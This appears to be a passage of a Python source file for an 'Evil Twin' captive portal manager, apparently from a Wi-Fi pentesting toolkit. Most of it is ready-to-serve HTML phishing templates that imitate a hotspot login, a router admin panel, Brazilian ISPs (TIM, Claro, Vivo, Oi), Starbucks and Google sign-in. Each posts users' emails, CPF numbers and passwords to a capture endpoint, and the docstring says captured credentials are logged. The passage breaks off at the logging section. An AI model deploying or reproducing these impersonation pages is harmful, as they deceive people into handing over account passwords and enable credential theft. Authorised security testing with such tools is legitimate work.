"""Evil Twin Portal Manager - captive portal server with built-in templates.

Manages HTML portal templates for Evil Twin / captive portal engagements.
Serves portals via Python's built-in http.server (no Flask/FastAPI dependency).
Captured credentials are written to a timestamped local log file.

Built-in templates:
  - generic_wifi: Generic ISP/hotspot login (neutral branding)
  - router_admin: Generic router admin panel
  - isp_tim: TIM Brasil login portal
  - isp_claro: Claro Brasil login portal
  - isp_vivo: Vivo Brasil login portal
  - isp_oi: Oi Brasil login portal
  - starbucks: Starbucks WiFi portal (from wifi-arsenal_6)
  - google: Google account login (from wifi-arsenal_6)

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""


import json
import logging
import threading
import urllib.parse
from datetime import datetime, timezone, UTC
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Any, Optional
from collections.abc import Callable

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Built-in portal templates
# ---------------------------------------------------------------------------

_TEMPLATES: dict[str, str] = {}

_TEMPLATES["generic_wifi"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#1a73e8;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:10px;padding:40px;max-width:400px;
  width:100%;box-shadow:0 4px 20px rgba(0,0,0,.2)}
h1{color:#1a73e8;text-align:center;margin-bottom:8px;font-size:22px}
p{color:#666;text-align:center;margin-bottom:24px;font-size:13px}
input{width:100%;padding:11px;margin-bottom:14px;border:1px solid #ddd;
  border-radius:6px;font-size:14px;outline:none}
input:focus{border-color:#1a73e8}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;
  border-radius:6px;font-size:15px;cursor:pointer;font-weight:600}
button:hover{background:#1557b0}
.note{font-size:11px;color:#999;text-align:center;margin-top:16px}
</style>
</head>
<body>
<div class="card">
  <h1>WiFi Access</h1>
  <p>Enter your credentials to connect to the network</p>
  <form action="/submit" method="POST">
    <input type="email" name="email" placeholder="Email address" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Connect</button>
  </form>
  <p class="note">By connecting you agree to the acceptable use policy</p>
</div>
</body>
</html>"""

_TEMPLATES["router_admin"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Router Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#2c3e50;display:flex;
  justify-content:center;align-items:center;min-height:100vh}
.box{background:#ecf0f1;border-radius:8px;padding:36px;width:340px;
  box-shadow:0 6px 24px rgba(0,0,0,.4)}
.brand{text-align:center;font-size:28px;font-weight:700;color:#2c3e50;
  margin-bottom:4px}
.sub{text-align:center;color:#7f8c8d;font-size:12px;margin-bottom:28px}
label{display:block;font-size:12px;color:#555;margin-bottom:4px;font-weight:600}
input{width:100%;padding:10px;margin-bottom:16px;border:1px solid #bdc3c7;
  border-radius:4px;font-size:14px}
input:focus{border-color:#3498db;outline:none}
button{width:100%;padding:11px;background:#3498db;color:#fff;border:none;
  border-radius:4px;font-size:14px;cursor:pointer;font-weight:600}
button:hover{background:#2980b9}
</style>
</head>
<body>
<div class="box">
  <div class="brand">&#128274; Admin Panel</div>
  <div class="sub">Router Administration Console</div>
  <form action="/submit" method="POST">
    <label>Username</label>
    <input type="text" name="username" placeholder="admin" required>
    <label>Password</label>
    <input type="password" name="password" required>
    <button type="submit">Login</button>
  </form>
</div>
</body>
</html>"""

_TEMPLATES["isp_tim"] = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>TIM - Acesso Wi-Fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#005aad;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:10px;padding:36px;max-width:380px;
  width:100%;box-shadow:0 4px 20px rgba(0,0,0,.2)}
.logo{text-align:center;font-size:36px;font-weight:900;color:#005aad;
  letter-spacing:-1px;margin-bottom:4px}
.logo span{color:#e40c0c}
h2{text-align:center;color:#333;font-size:16px;font-weight:400;margin-bottom:24px}
input{width:100%;padding:12px;margin-bottom:14px;border:1px solid #ccc;
  border-radius:6px;font-size:14px}
button{width:100%;padding:12px;background:#005aad;color:#fff;border:none;
  border-radius:6px;font-size:15px;cursor:pointer;font-weight:700}
button:hover{background:#004080}
.footer{font-size:11px;color:#999;text-align:center;margin-top:14px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">T<span>IM</span></div>
  <h2>Acesso ao Wi-Fi TIM</h2>
  <form action="/submit" method="POST">
    <input type="text" name="cpf" placeholder="CPF ou e-mail cadastrado" required>
    <input type="password" name="password" placeholder="Senha" required>
    <button type="submit">Entrar</button>
  </form>
  <p class="footer">Ao continuar, voce aceita os Termos de Uso TIM</p>
</div>
</body>
</html>"""

_TEMPLATES["isp_claro"] = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Claro - Wi-Fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#e2001a;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:10px;padding:36px;max-width:380px;
  width:100%;box-shadow:0 4px 20px rgba(0,0,0,.2)}
.logo{text-align:center;font-size:32px;font-weight:900;color:#e2001a;
  margin-bottom:4px}
h2{text-align:center;color:#444;font-size:15px;margin-bottom:24px}
input{width:100%;padding:12px;margin-bottom:14px;border:1px solid #ddd;
  border-radius:6px;font-size:14px}
button{width:100%;padding:12px;background:#e2001a;color:#fff;border:none;
  border-radius:6px;font-size:15px;cursor:pointer;font-weight:700}
button:hover{background:#b0000e}
.footer{font-size:11px;color:#999;text-align:center;margin-top:14px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">Claro</div>
  <h2>Conecte-se ao Wi-Fi Claro</h2>
  <form action="/submit" method="POST">
    <input type="text" name="cpf" placeholder="CPF ou e-mail Claro" required>
    <input type="password" name="password" placeholder="Senha" required>
    <button type="submit">Conectar</button>
  </form>
  <p class="footer">Ao conectar, voce concorda com os Termos de Uso Claro</p>
</div>
</body>
</html>"""

_TEMPLATES["isp_vivo"] = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vivo - Wi-Fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#660099;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:10px;padding:36px;max-width:380px;
  width:100%;box-shadow:0 4px 20px rgba(0,0,0,.2)}
.logo{text-align:center;font-size:32px;font-weight:900;color:#660099;
  margin-bottom:4px}
h2{text-align:center;color:#444;font-size:15px;margin-bottom:24px}
input{width:100%;padding:12px;margin-bottom:14px;border:1px solid #ddd;
  border-radius:6px;font-size:14px}
button{width:100%;padding:12px;background:#660099;color:#fff;border:none;
  border-radius:6px;font-size:15px;cursor:pointer;font-weight:700}
button:hover{background:#4a0070}
.footer{font-size:11px;color:#999;text-align:center;margin-top:14px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">Vivo</div>
  <h2>Portal de Acesso Wi-Fi Vivo</h2>
  <form action="/submit" method="POST">
    <input type="text" name="cpf" placeholder="CPF ou telefone Vivo" required>
    <input type="password" name="password" placeholder="Senha" required>
    <button type="submit">Acessar</button>
  </form>
  <p class="footer">Conectando voce aceita os Termos de Uso Vivo</p>
</div>
</body>
</html>"""

_TEMPLATES["isp_oi"] = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Oi - Wi-Fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#f5a623;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:10px;padding:36px;max-width:380px;
  width:100%;box-shadow:0 4px 20px rgba(0,0,0,.2)}
.logo{text-align:center;font-size:42px;font-weight:900;color:#f5a623;
  margin-bottom:4px}
h2{text-align:center;color:#444;font-size:15px;margin-bottom:24px}
input{width:100%;padding:12px;margin-bottom:14px;border:1px solid #ddd;
  border-radius:6px;font-size:14px}
button{width:100%;padding:12px;background:#f5a623;color:#fff;border:none;
  border-radius:6px;font-size:15px;cursor:pointer;font-weight:700}
button:hover{background:#d48b10}
.footer{font-size:11px;color:#999;text-align:center;margin-top:14px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">Oi</div>
  <h2>Acesso Wi-Fi Oi</h2>
  <form action="/submit" method="POST">
    <input type="text" name="cpf" placeholder="CPF ou e-mail Oi" required>
    <input type="password" name="password" placeholder="Senha" required>
    <button type="submit">Entrar</button>
  </form>
  <p class="footer">Ao continuar, voce concorda com os Termos de Uso Oi</p>
</div>
</body>
</html>"""

_TEMPLATES["starbucks"] = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Starbucks WiFi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#00704A;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{background:#fff;border-radius:10px;padding:40px;max-width:400px;
  width:100%;box-shadow:0 4px 6px rgba(0,0,0,.1)}
.logo{text-align:center;font-size:48px;margin-bottom:20px}
h1{color:#00704A;text-align:center;margin-bottom:10px;font-size:24px}
p{color:#666;text-align:center;margin-bottom:30px;font-size:14px}
input{width:100%;padding:12px;margin-bottom:15px;border:1px solid #ddd;
  border-radius:5px;font-size:14px}
button{width:100%;padding:12px;background:#00704A;color:#fff;border:none;
  border-radius:5px;font-size:16px;cursor:pointer;font-weight:700}
button:hover{background:#005a3c}
.terms{font-size:12px;color:#999;text-align:center;margin-top:20px}
</style>
</head>
<body>
<div class="container">
  <div class="logo">&#9749;</div>
  <h1>Welcome to Starbucks WiFi</h1>
  <p>Please sign in to access complimentary WiFi</p>
  <form action="/submit" method="POST">
    <input type="email" name="email" placeholder="Email Address" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Connect</button>
  </form>
  <p class="terms">By connecting, you agree to our Terms of Service</p>
</div>
</body>
</html>"""

_TEMPLATES["google"] = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,maximum-scale=1,initial-scale=1">
<title>Google - Sign in</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:Arial,sans-serif}
body{display:flex;justify-content:center;align-items:center;
  min-height:100vh;background:#f1f1f1}
.login-container{background:#fff;padding:28px;border-radius:8px;
  width:360px;box-shadow:0 2px 10px rgba(0,0,0,.12)}
#logo{display:block;margin:0 auto 20px}
h1{text-align:center;margin-bottom:20px;font-size:22px;color:#202124}
h2{text-align:center;margin-bottom:20px;font-size:15px;color:#444;font-weight:400}
.g-input{display:block;width:100%;padding:11px;margin-bottom:12px;
  border:1px solid #ddd;border-radius:5px;font-size:14px}
.g-input:focus{border-color:#1a73e8;outline:none}
.gbtn-primary{display:block;width:100%;padding:11px;border:none;
  border-radius:5px;background:#1a73e8;color:#fff;cursor:pointer;
  font-size:14px;font-weight:600}
.gbtn-primary:hover{background:#1557b0}
</style>
</head>
<body>
<div class="login-container">
  <svg id="logo" viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
    <g><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/></g>
    <g><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"/></g>
    <g><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/></g>
  </svg>
  <h1>Sign in</h1>
  <h2>Use your Google Account</h2>
  <form action="/submit" method="POST">
    <input name="email" type="text" class="g-input" placeholder="Email" required>
    <input name="password" type="password" class="g-input" placeholder="Password" required>
    <button class="gbtn-primary" type="submit">Next</button>
  </form>
</div>
</body>
</html>"""


# ---------------------------------------------------------------------------
# Capture log entry
# ---------------------------------------------------------------------------

